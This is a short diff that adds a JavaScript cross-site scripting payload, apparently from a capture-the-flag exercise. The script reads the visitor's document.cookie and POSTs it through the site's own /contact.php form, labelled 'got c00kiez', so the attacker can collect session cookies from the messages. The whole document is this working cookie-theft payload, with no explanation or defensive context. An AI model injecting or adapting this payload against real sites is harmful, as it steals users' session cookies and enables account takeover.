@@ -1,0 +1,6 @@
+<script>
+var hr = new XMLHttpRequest();
+hr.open("POST", "/contact.php", true);
+hr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+hr.send("name=got c00kiez&email=catalin@csc16ro&message="+document.cookie);
+</script>
